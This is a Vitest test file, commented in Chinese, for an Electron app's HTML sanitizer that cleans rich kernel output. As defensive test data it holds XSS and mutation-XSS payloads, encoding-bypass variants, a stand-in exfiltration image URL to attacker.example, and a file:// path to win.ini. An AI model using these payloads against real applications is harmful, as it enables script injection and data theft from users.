/**
 * 内核富输出消毒测试（任务 9.2 的安全要求）。
 *
 * 这是不可信内核输出与 Electron 渲染进程之间唯一的边界。渲染进程能通过 preload
 * 桥调用后端，因此一次 XSS 不只是弹个框——它能读凭据引用、发起审批、删制品。
 *
 * 测试用 jsdom 而不是 happy-dom：DOMPurify 自己的测试套件跑在 jsdom 上，
 * mutation XSS 这类问题高度依赖 HTML 解析器的具体行为，用它测最接近真实浏览器。
 *
 * @vitest-environment jsdom
 */

import { describe, expect, it } from 'vitest';

import {
  pickRenderable,
  sanitizeHtml,
  sanitizeWithReport,
} from '../packages/ui/src/lib/sanitize.js';

describe('脚本注入', () => {
  it('剥掉 script 标签但保留文本', () => {
    const result = sanitizeHtml('<p>安全内容</p><script>alert(1)</script>');
    expect(result).toContain('安全内容');
    expect(result).not.toContain('<script');
    expect(result).not.toContain('alert');
  });

  it('剥掉事件处理属性', () => {
    const result = sanitizeHtml('<div onclick="alert(1)">点我</div>');
    expect(result).toContain('点我');
    expect(result).not.toContain('onclick');
  });

  it('剥掉 onerror（最常见的 img XSS 载荷）', () => {
    const result = sanitizeHtml('<img src=x onerror="alert(1)">');
    expect(result).not.toContain('onerror');
  });

  it('剥掉 iframe', () => {
    const result = sanitizeHtml('<iframe src="https://evil.example"></iframe>');
    expect(result).not.toContain('iframe');
  });

  it('剥掉 javascript: 协议的链接', () => {
    // a 标签本身不在白名单里，因此整个消失
    const result = sanitizeHtml('<a href="javascript:alert(1)">链接</a>');
    expect(result).not.toContain('javascript:');
  });

  it('剥掉 svg 里的内联脚本', () => {
    // SVG 是可执行的 XML，内联 script 完全合法
    const result = sanitizeHtml('<svg><script>alert(1)</script></svg>');
    expect(result).not.toContain('alert');
  });

  it('剥掉 form 与 input，防止伪造表单', () => {
    const result = sanitizeHtml('<form action="https://evil.example"><input name="key"></form>');
    expect(result).not.toContain('<form');
    expect(result).not.toContain('<input');
  });
});

describe('style 与 class 不被允许', () => {
  it('剥掉 style 属性', () => {
    /*
     * style 是 CSS 注入的入口：position:fixed 加高 z-index 就能盖住整个界面，
     * 伪造一个假的审批卡片骗用户点同意。pandas 的表格丑一点不值这个风险。
     */
    const result = sanitizeHtml(
      '<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:9999">假界面</div>',
    );
    expect(result).not.toContain('style');
    expect(result).not.toContain('position');
    // 内容保留，只是不带样式
    expect(result).toContain('假界面');
  });

  it('剥掉 class，防止借用应用样式伪装成界面元素', () => {
    const result = sanitizeHtml('<div class="approval approval__actions">假审批</div>');
    expect(result).not.toContain('class');
    expect(result).toContain('假审批');
  });

  it('剥掉 data-* 属性', () => {
    // data-* 可能被应用自己的脚本读取，形成从不可信内容到应用逻辑的通路
    const result = sanitizeHtml('<div data-approval-id="ap_1">x</div>');
    expect(result).not.toContain('data-approval-id');
  });
});

describe('表格结构保留（pandas 的 to_html 要能读）', () => {
  it('保留表格标签与结构', () => {
    const html =
      '<table><thead><tr><th>列A</th><th>列B</th></tr></thead>' +
      '<tbody><tr><td>1</td><td>2</td></tr></tbody></table>';
    const result = sanitizeHtml(html);

    expect(result).toContain('<table>');
    expect(result).toContain('<thead>');
    expect(result).toContain('<th>');
    expect(result).toContain('列A');
    expect(result).toContain('2');
  });

  it('保留 colspan 与 rowspan', () => {
    const result = sanitizeHtml('<table><tr><td colspan="2" rowspan="3">合并</td></tr></table>');
    expect(result).toContain('colspan');
    expect(result).toContain('rowspan');
  });

  it('保留 pre 与 code，代码输出要能看', () => {
    const result = sanitizeHtml('<pre><code>def f(): pass</code></pre>');
    expect(result).toContain('<pre>');
    expect(result).toContain('def f()');
  });

  it('带 style 的 pandas 表格：结构保留、样式剥掉', () => {
    // pandas 的 to_html 会带一堆 style 与 class
    const html =
      '<table border="1" class="dataframe" style="width:100%">' +
      '<tr style="text-align:right"><th>idx</th><td>3.14</td></tr></table>';
    const result = sanitizeHtml(html);

    expect(result).toContain('3.14');
    expect(result).toContain('idx');
    expect(result).not.toContain('style');
    expect(result).not.toContain('dataframe');
  });
});

describe('图片来源限制', () => {
  it('允许 data: 内嵌图片', () => {
    const src = 'data:image/png;base64,iVBORw0KGgo=';
    const result = sanitizeHtml(`<img src="${src}" alt="图">`);
    expect(result).toContain('data:image/png;base64');
  });

  it('移除外链图片的 src 并说明原因', () => {
    /*
     * 允许 http(s) 的话，一段 <img src="https://attacker/log?data=..."> 就成了
     * 数据外泄通道——而这个请求由渲染层发出，看起来完全正常。
     */
    const result = sanitizeHtml('<img src="https://attacker.example/log?d=secret">');
    expect(result).not.toContain('attacker.example');
    expect(result).toContain('已移除');
  });

  it('移除非图片的 data: URI', () => {
    // data:text/html 可以承载脚本
    const result = sanitizeHtml('<img src="data:text/html;base64,PHNjcmlwdD4=">');
    expect(result).not.toContain('text/html');
  });

  it('移除 file: 协议的图片', () => {
    const result = sanitizeHtml('<img src="file:///C:/Windows/win.ini">');
    expect(result).not.toContain('win.ini');
  });
});

describe('改动报告', () => {
  it('无改动时报告 false', () => {
    const { modified } = sanitizeWithReport('<p>纯净内容</p>');
    expect(modified).toBe(false);
  });

  it('有内容被剥离时报告 true', () => {
    // 必须告知用户。不说的话，一个被剥掉了关键单元格的表格看起来就是
    // 「数据本来如此」
    const { modified } = sanitizeWithReport('<p>x</p><script>alert(1)</script>');
    expect(modified).toBe(true);
  });
});

describe('富输出表示优先级', () => {
  it('图优先于纯文本', () => {
    // Jupyter 常常同时给图和一段「<Figure size 640x480>」，后者对用户毫无价值
    const result = pickRenderable({
      'image/png': 'iVBORw0KGgo=',
      'text/plain': '<Figure size 640x480 with 1 Axes>',
    });
    expect(result.kind).toBe('image');
  });

  it('HTML 优先于纯文本', () => {
    const result = pickRenderable({
      'text/html': '<table><tr><td>1</td></tr></table>',
      'text/plain': '   0\n0  1',
    });
    expect(result.kind).toBe('html');
  });

  it('SVG 走 HTML 路径消毒而不是当图片直出', () => {
    // SVG 是可执行的 XML。当图片直出等于放行内联脚本
    const result = pickRenderable({
      'image/svg+xml': '<svg><script>alert(1)</script><circle r="5"/></svg>',
    });
    expect(result.kind).toBe('html');
    if (result.kind === 'html') {
      expect(result.html).not.toContain('alert');
    }
  });

  it('只有纯文本时用纯文本', () => {
    const result = pickRenderable({ 'text/plain': '42' });
    expect(result).toEqual({ kind: 'text', text: '42' });
  });

  it('JSON 表示被序列化', () => {
    // MimeBundle 的值是 unknown，JSON 表示本身就是对象
    const result = pickRenderable({ 'application/json': { a: 1 } });
    expect(result.kind).toBe('text');
    if (result.kind === 'text') expect(result.text).toContain('"a": 1');
  });

  it('认不出的类型如实报告有哪些表示', () => {
    const result = pickRenderable({ 'application/vnd.plotly.v1+json': 'x' });
    expect(result.kind).toBe('unknown');
    if (result.kind === 'unknown') expect(result.mimes).toContain('application/vnd.plotly.v1+json');
  });

  it('空 bundle 也不崩', () => {
    expect(pickRenderable({}).kind).toBe('unknown');
  });

  it('非字符串的图像载荷被跳过', () => {
    // 内核理论上可以返回任何 JSON 值。当成 base64 拼进 src 会得到
    // 「data:image/png;base64,[object Object]」
    const result = pickRenderable({ 'image/png': { nested: true }, 'text/plain': '兜底' });
    expect(result).toEqual({ kind: 'text', text: '兜底' });
  });
});

describe('mutation XSS 与畸形输入', () => {
  /**
   * 断言消毒结果里没有可执行构造。
   *
   * **按解析后的 DOM 断言，不按序列化字符串断言。** 字符串匹配两头都不准：
   * 一个出现在 title 属性值里的 `onerror=alert(1)` 是惰性文本，字符串匹配会
   * 误报；而 `&#111;nerror` 这类编码载荷在字符串里看着安全，解析后却成了
   * 真属性，字符串匹配会漏报。
   *
   * 这也更贴近真实路径：React 通过 innerHTML 设置消毒结果，浏览器会重新解析。
   * 因此「重新解析之后的 DOM 里有什么」才是唯一相关的问题。
   */
  function assertInert(html: string, label: string): void {
    const container = document.createElement('div');
    container.innerHTML = sanitizeHtml(html);

    for (const el of container.querySelectorAll('*')) {
      for (const attr of el.attributes) {
        expect(attr.name.toLowerCase(), `${label} → <${el.tagName.toLowerCase()}>`).not.toMatch(
          /^on/,
        );
      }
      // 白名单外的可执行元素一个都不该出现
      expect(
        ['SCRIPT', 'IFRAME', 'OBJECT', 'EMBED', 'FORM', 'INPUT', 'STYLE', 'LINK', 'BASE'],
        label,
      ).not.toContain(el.tagName);
    }

    // img 若存在，src 必须是内嵌图片
    for (const img of container.querySelectorAll('img')) {
      const src = img.getAttribute('src');
      if (src !== null) {
        expect(src, label).toMatch(/^data:image\//);
      }
    }
  }

  it('嵌套畸形标签不产生可执行内容', () => {
    const payloads = [
      '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
      '<svg></p><style><g title="</style><img src=x onerror=alert(1)>">',
      '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
      '<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>',
      '<listing><img src=x onerror=alert(1)></listing>',
    ];

    for (const payload of payloads) assertInert(payload, payload);
  });

  it('大小写混写与编码变体不能绕过', () => {
    for (const payload of [
      '<ScRiPt>alert(1)</ScRiPt>',
      '<IMG SRC=x OnErRoR=alert(1)>',
      '<img src=x onerror=&#97;lert(1)>',
      '<img src=x o\u006Eerror=alert(1)>',
      '<img/src="x"/onerror=alert(1)>',
    ]) {
      assertInert(payload, payload);
    }
  });

  it('非 img 标签携带的 src 被移除', () => {
    // 属性白名单里放开 src 之后，任何标签都可能带它
    const container = document.createElement('div');
    container.innerHTML = sanitizeHtml('<div src="https://evil.example/x">x</div>');
    expect(container.querySelector('div')?.hasAttribute('src')).toBe(false);
  });

  it('空串与非 HTML 输入不崩', () => {
    expect(sanitizeHtml('')).toBe('');
    expect(sanitizeHtml('纯文本没有标签')).toContain('纯文本');
    expect(sanitizeHtml('<<<>>>')).toBeTypeOf('string');
  });

  it('极长输入不崩', () => {
    const long = `<p>${'x'.repeat(200_000)}</p>`;
    expect(sanitizeHtml(long).length).toBeGreaterThan(1000);
  });
});
